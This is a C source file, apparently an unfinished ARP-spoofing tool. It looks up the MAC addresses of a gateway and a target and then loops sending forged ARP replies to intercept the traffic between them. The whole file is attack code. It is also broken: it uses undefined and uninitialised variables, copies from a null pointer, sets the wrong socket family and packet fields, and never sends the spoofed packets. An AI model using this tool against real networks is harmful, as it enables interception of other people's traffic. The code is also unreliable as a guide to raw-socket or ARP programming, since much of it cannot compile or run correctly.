#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <sys/socket.h>
#include <netpacket/packet.h>
#include <net/ethernet.h>
#include "headers.h"
#include "inject_new.h"
#include "utils.h"

int initialize_inject(const char *gateway_ip, char *target_ip, char *own_ip, const char *own_mac, char *ifname) {
    
    uint32_t my_ip;
    uint8_t my_mac[6];
    char *interface = ifname;
    uint32_t target_ip_one;
    uint32_t target_ip_two;

    printf("Initializing inject\n");
    
    // Convert IP address strings to numerical form
    target_ip_one = (uint32_t)inet_addr(gateway_ip);
    target_ip_two = (uint32_t)inet_addr(target_ip);
    my_ip = (uint32_t)inet_addr(target_ip);

    if (target_ip_one == -1 || target_ip_two == -1 || my_ip == -1) {
        perror("inet_addr() returned an error: ");
        exit(1);
    }
    // Convert own mac to numerical form
    str_to_mac(own_mac, my_mac);
    
    printf("finding MAC addresses of targets\n");

    // Given the two IP addresses, find out the MAC addresses   
    uint8_t *mac_addr_one = get_mac_addr(target_ip_one, my_ip, my_mac, interface);
    uint8_t *mac_addr_two = get_mac_addr(target_ip_two, my_ip, my_mac, interface);

    
    printf("MAC addresses found\n");

    // Construct ARP Packets for spoofing
    


    // Start the spoofing and analyze packets    

    printf("Starting spoofing\n");
    

    uint32_t target_one_ip;
    uint32_t target_two_ip;

    while (1) {
        arp_spoof(target_one_ip, target_two_ip);
        arp_spoof(target_two_ip, target_one_ip);   // mac_target_two, own_mac are other args
        sleep(1);
    }    
    
    return 0;
}


uint8_t *get_mac_addr(uint32_t target_ip, uint32_t own_ip, uint8_t *own_mac, char *ifname) {
    
    struct arp_header arp_hdr;
    arp_hdr.hardware_type = htons(1);
    arp_hdr.protocol_type = htons(0x0800);
    arp_hdr.hardware_size = 6;
    arp_hdr.protocol_size = 4;
    arp_hdr.opcode = htons(ARP_REQUEST);         // ARP_REQUEST = 1, ARP_REPLY = 2
    
    memcpy(arp_hdr.sha, own_mac, 6);
    memcpy(arp_hdr.spa, &own_ip, 4);
    memcpy(arp_hdr.tha, 0, 6);
    memcpy(arp_hdr.tpa, &target_ip, 4);
    
    struct sockaddr_ll dest_addr = {0};
    dest_addr.sll_family = AF_PACKET;
    dest_addr.sll_protocol = htons(ETH_P_ARP);
    dest_addr.sll_ifindex = if_nametoindex(ifname);
    dest_addr.sll_halen = 6;
    
    uint8_t broadcast_mac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
    memcpy(dest_addr.sll_addr, broadcast_mac, 6);
    
    int sock = socket(AF_INET, SOCK_RAW, htons(ETH_P_ALL));
    if (sock == -1) {
        perror("Error: socket()");
        exit(1);
    }

    
    if (bind(sock, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) < 0) {
        perror("bind failed");
        exit(1);
    }

    struct timeval tv;
    tv.tv_sec = 1;
    tv.tv_usec = 0;
    
    if (setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv)) < 0) {
        perror("setsockopt failed");
        exit(1);
    }

    int bytes_sent = sendto(sock, req, sizeof(struct arp_header), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
    if (bytes_sent < 0) {
        perror("sendto failed");
        exit(1);
    }
    
    int bytes_recvd = recvfrom(sock, res, sizeof(struct arp_header), 0, NULL, NULL);
    if (bytes_recvd < 0) {
        exit(1);
    }
    return bytes_recvd;
}

void arp_spoof(uint32_t ip_target, uint32_t ip_spoof) { 
    
    struct ethernet_header *eth_hdr = malloc(sizeof(struct ethernet_header));
    struct arp_header *arp_hdr = malloc(sizeof(struct arp_header));
    
    // Make arp packet 
    arp_hdr->hardware_type = htons(1);
    arp_hdr->protocol_type = htons(1);
    arp_hdr->hardware_size = htons(1);
    arp_hdr->protocol_size = htons(1);
    arp_hdr->opcode = htons(1);
    
    memcpy(arp_hdr->sha, src_mac, 6);
    memcpy(arp_hdr->spa, src_ip, 4);
    memcpy(arp_hdr->tha, target_mac, 6);
    memcpy(arp_hdr->tpa, ip_target, 4);
    
    // Make ethernet packet 
    memcpy(eth_hdr->daddr, target_mac, 6);
    memcpy(eth_hdr->saddr, src_mac, 6);
    
    eth_hdr->ether_type = AF_INET; 
    

    uint32_t ip_send = ip_target;

}


